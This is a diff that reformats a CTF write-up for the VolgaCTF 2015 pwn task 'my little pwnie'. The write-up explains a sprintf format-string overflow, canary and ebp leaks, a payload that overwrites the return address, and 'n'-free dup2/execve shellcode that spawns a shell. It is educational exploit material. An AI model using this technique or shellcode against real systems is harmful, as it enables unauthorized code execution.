@@ -1,24 +1,26 @@
 ---
 type: ctf
-title : VolgaCTF 2015 Quals - my little pwnie
+title: VolgaCTF 2015 Quals - my little pwnie
 tags: [VolgaCTF, pwnie]
-date : 2015-05-22
+date: 2015-05-22
 author: Eno
 featuredImage: https://static.wixstatic.com/media/acbc49_eafea6908cc44274ace2f6c77e1efa92~mv2.jpg/v1/fill/w_400,h_400,al_c/acbc49_eafea6908cc44274ace2f6c77e1efa92~mv2.jpg
 ---
 
-**Category:** Pwn
-**Points:** 250
-> Just another pwn task. Break in!
-> nc pwnie.2015.volgactf.ru 7777
+**Category:** Pwn **Points:** 250
+
+> Just another pwn task. Break in! nc pwnie.2015.volgactf.ru 7777
 > [my_little_pwnie](http://files.2015.volgactf.ru/my_little_pwnie/my_little_pwnie)
 
-I solve the challenge after the end of the CTF, because I think this is a great challenge for practicing **format string** and **sprintf BOF vulnerability**. Special thanks to [Lays](http://blog.l4ys.tw) for putting the exploit on the trello and let me have time to study the challenge. 
+I solve the challenge after the end of the CTF, because I think this is a great challenge for practicing **format
+string** and **sprintf BOF vulnerability**. Special thanks to [Lays](http://blog.l4ys.tw) for putting the exploit on the
+trello and let me have time to study the challenge.
 
 We got a 32 bit ELF, with stack guard enabled, but no NX.  
-It's a simple echo server. Whenever someone connect to it, it fork a process to handle the request. First it ask us to input some string, and then it echo the string back to us.  
+It's a simple echo server. Whenever someone connect to it, it fork a process to handle the request. First it ask us to
+input some string, and then it echo the string back to us.
 
-Launch it with IDA Pro and take a look at it:  
+Launch it with IDA Pro and take a look at it:
 
 ```c start_echo
 int __cdecl start_echo(int fd)
@@ -95,24 +97,35 @@ LABEL_9:
     return result;
 }
 ```
+
 So we found that there's a **format string** vulnerability at the line  
 `sprintf(a1 + 6, user_input);`  
-But notice that the program will filter out the character 'n', which means we can't use **%n** to write the memory. 
+But notice that the program will filter out the character 'n', which means we can't use **%n** to write the memory.
 
-Fortunately, the vulnerability's happened in `sprintf`, not `printf`. 
-`sprintf(a1 + 6, user_input)` means the `user_input` will be **output** to buffer `a1` (the one that `start_echo` pass into `echoing`). 
+Fortunately, the vulnerability's happened in `sprintf`, not `printf`. `sprintf(a1 + 6, user_input)` means the
+`user_input` will be **output** to buffer `a1` (the one that `start_echo` pass into `echoing`).
 
-This behavior can be view as the program **copy** `user_input`'s content to `a1`. If we input string `"%45c"`, the program will output 45 characters to `a1`, which is, **copy** 45 characters to `a1`.  
+This behavior can be view as the program **copy** `user_input`'s content to `a1`. If we input string `"%45c"`, the
+program will output 45 characters to `a1`, which is, **copy** 45 characters to `a1`.
 
-So if we construct the payload string carefully, we can overwrite the return address in `start_echo()`. First we'll have to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at `%26$p`. We also need to leak `start_echo()`'s `ebp` too, since we need to calculate the address of `a1` ( which is on the stack in function `start_echo()` ). We found that `ebp` is at `%29$p`.
+So if we construct the payload string carefully, we can overwrite the return address in `start_echo()`. First we'll have
+to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at `%26$p`. We also
+need to leak `start_echo()`'s `ebp` too, since we need to calculate the address of `a1` ( which is on the stack in
+function `start_echo()` ). We found that `ebp` is at `%29$p`.
 
-So by leaking canary & `start_echo()`'s ebp , we can construct our payload now. But there're some details we need to be aware of:
-1. **`sprintf` will stop at null byte**. That is, when `sprintf` encounter a null byte, it will write the null byte to the buffer and stop. 
-2. So, **since the first byte of the canary is always null byte**, we'll have to modify the canary first, so `sprintf` will continue writing bytes to buffer and let us overwrite the return address.
-3. After we overwrite the return address, we'll have to change the canary back to its correct value, by sending another payload string to `sprintf`. 
+So by leaking canary & `start_echo()`'s ebp , we can construct our payload now. But there're some details we need to be
+aware of:
+
+1. **`sprintf` will stop at null byte**. That is, when `sprintf` encounter a null byte, it will write the null byte to
+   the buffer and stop.
+2. So, **since the first byte of the canary is always null byte**, we'll have to modify the canary first, so `sprintf`
+   will continue writing bytes to buffer and let us overwrite the return address.
+3. After we overwrite the return address, we'll have to change the canary back to its correct value, by sending another
+   payload string to `sprintf`.
 4. Don't forget to write the `fd` too, or else it will be overwritten to null byte (thanks to `sprintf` apparently )
 
 Here's the payload string:
+
 ```python
 canary |= 0x41 # remove the null byte first
 payload : "%122c" # padding to canary
@@ -128,21 +141,30 @@ payload : "%122c" # add the null byte back into the canary
 send(payload)
 ```
 
-So now we overwrite the return address of function `start_echo()` and let it jump to the buffer `a1`, which we can put our shellcode on it. But again, there're some limitations:
- 1. It's a **fork server**, so we can't simply just execute `execve("/bin/sh")`. The problem cause by file descriptor will make us fail to execute our own command after we get the shell.
- 2. So, we'll have to construct a shellcode, which execute `dup2(4, 0)`, `dup2(4, 1)` and `dup2(4, 2)` before executing `execve("/bin/sh")`.
- 3. Don't forget the program will filter out the character 'n', so we'll have to do something with it.
-    
-For problem 3, my solution was construct a shellcode without having character 'n'. Or, you can just overwrite the return address to `user_input`, since the program doesn't modify the input, the original input string will still remain on the buffer.
+So now we overwrite the return address of function `start_echo()` and let it jump to the buffer `a1`, which we can put
+our shellcode on it. But again, there're some limitations:
 
-Anyway, I choose to construct a shellcode without having character 'n'. Typically, during the shellcode construction for executing `execve("/bin/sh")`, we'll have the following assembly:
+1.  It's a **fork server**, so we can't simply just execute `execve("/bin/sh")`. The problem cause by file descriptor
+    will make us fail to execute our own command after we get the shell.
+2.  So, we'll have to construct a shellcode, which execute `dup2(4, 0)`, `dup2(4, 1)` and `dup2(4, 2)` before executing
+    `execve("/bin/sh")`.
+3.  Don't forget the program will filter out the character 'n', so we'll have to do something with it.
+
+For problem 3, my solution was construct a shellcode without having character 'n'. Or, you can just overwrite the return
+address to `user_input`, since the program doesn't modify the input, the original input string will still remain on the
+buffer.
+
+Anyway, I choose to construct a shellcode without having character 'n'. Typically, during the shellcode construction for
+executing `execve("/bin/sh")`, we'll have the following assembly:
 
 ```
 push 0x68732f2f     ; hs//
 push 0x6e69622f     ; nib/
 ```
 
-Which has 'n' in it. However, we can simply use `xor` to eliminate the character 'n'. Since `0x6e69622f : 0x91969dd0 ^ 0xffffffff`, we can modify the assembly into:
+Which has 'n' in it. However, we can simply use `xor` to eliminate the character 'n'. Since
+`0x6e69622f : 0x91969dd0 ^ 0xffffffff`, we can modify the assembly into:
+
 ```
 xor ecx, ecx
 dec ecx ; ecx : 0xffffffff
@@ -151,6 +173,7 @@ push ecx
 ```
 
 So here's the entire assembly:
+
 ```
 BITS 32
 
@@ -169,7 +192,7 @@ d:
 	inc ecx
 	cmp ecx, 0x3
 	jne d
-	
+
 	; execve(/bin/sh)
 	xor eax, eax
 	mov al, 0xb
@@ -186,6 +209,7 @@ d:
 ```
 
 Finally, we have the exploit:
+
 ```python
 from pwn import *
 import time
